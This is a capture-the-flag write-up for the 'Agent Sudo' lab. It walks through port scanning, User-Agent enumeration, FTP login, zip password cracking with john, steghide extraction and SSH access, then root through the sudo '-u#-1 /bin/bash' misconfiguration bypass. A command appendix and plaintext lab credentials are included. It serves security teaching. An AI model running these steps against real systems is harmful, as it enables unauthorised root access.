# Agent Sudo -- CTF Writeup -- Web Enumeration, Steganography, SSH Access, and Sudo Privilege Escalation

> Short summary  
> Initial access was gained via web enumeration with custom User-Agent headers, revealing a hint for weak credentials. Used FTP to retrieve files, extracted hidden zip and steganography data to obtain SSH credentials for `james`. SSH login provided user-level access and a user flag. Privilege escalation achieved via sudo misconfiguration using the `sudo -u#-1 /bin/bash` technique to spawn a root shell and read `/root/root.txt`.

---

## Target
- IP: `10.201.41.224`
- Room: Agent Sudo
- Scan date (local notes): 2025-09-12

---

## 1 — Recon / Port scan

Command:
```bash
nmap -sS 10.201.41.224
```

Key output:
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Notes: FTP, SSH, and HTTP were open. Anonymous FTP was disabled. Webserver required custom User-Agent headers.

---

## 2 — Web enumeration

Website message on port 80:
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

Using curl to iterate User-Agent values (single letters) revealed a valid agent `C`:
```bash
curl -A "C" -L 10.201.41.224
```

Response indicated `Chris` has a weak password, hinting at FTP/SSH login credentials.

---

## 3 — FTP enumeration

Logged in with credentials found via Hydra (`chris:crystal`):
```bash
ftp> open 10.201.41.224
230 Login successful.
ftp> ls
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

Downloaded and inspected `To_agentJ.txt`:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Other files (images) contained hidden information.

---

## 4 — Steganography / hidden data extraction

### Extracting hidden zip from `cutie.png`
```bash
unzip cutie.png
# warning about extra bytes; attempting 7z instead
```

### Using zip2john and john to crack the zip
```bash
zip2john hidden.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# password found: alien
```

### Reading `To_agentR.txt`
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
- Base64 decoded (`QXJlYTUx`) → `Area51` — thought to be used as agent J's password, however is the steganography password.

### Extracting steganography from `cute-alien.jpg`
```bash
steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
cat message.txt
```
```
Hi james,

Glad you find this message. Your login password is hackerrules!
```

---

## 5 — SSH login and user flag

SSH using credentials `james:hackerrules`:
```bash
ssh james@10.201.41.224
```

Located user files:
```bash
ls
Alien_autospy.jpg  user_flag.txt
cat user_flag.txt
```

Copied `Alien_autospy.jpg` back to local machine and verified with reverse image search.

---

## 6 — Privilege escalation

Transferred linPEAS for enumeration:
```bash
scp linPEAS/linpeas.sh james@10.201.41.224:/tmp/
```

Checked sudo permissions:
```bash
sudo -l
```

Output:
```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Exploited misconfiguration using `sudo -u#-1 /bin/bash`:
```bash
sudo -u#-1 /bin/bash
whoami
# root
```

---

## 7 — Root flag

With root privileges:
```bash
cat /root/root.txt
%flag removed%
```

---

## 8 — Post-exploit notes & cleanup

- Remove tools and credentials after use.
- User `james` had SUDO misconfiguration allowing root escalation — never allow `(ALL, !root) /bin/bash` in production.
- Steganography and hidden zip files can reveal passwords — always check for hidden data in public resources.

---

## 9 — References

- linPEAS (PEASS-ng) — https://github.com/carlospolop/PEASS-ng  
- Exploit-DB Sudo Misconfiguration: https://www.exploit-db.com/exploits/47502  
- Steghide — https://steghide.sourceforge.net/  
- CyberChef — https://gchq.github.io/CyberChef/  

---

## 10 — Appendix: commands used

```bash
# Recon
nmap -sS 10.201.41.224

# Web enumeration
curl -A "C" -L 10.201.41.224

# FTP
ftp 10.201.41.224
# download To_agentJ.txt, cutie.png, cute-alien.jpg

# Extract zip from png
unzip cutie.png
zip2john hidden.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
cat To_agentR.txt

# Stego
steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
cat message.txt

# SSH
ssh james@10.201.41.224
cat user_flag.txt
scp Alien_autospy.jpg /image.jpg

# Privilege escalation
scp linpeas.sh james@10.201.41.224:/tmp/
sudo -u#-1 /bin/bash
cat /root/root.txt
```
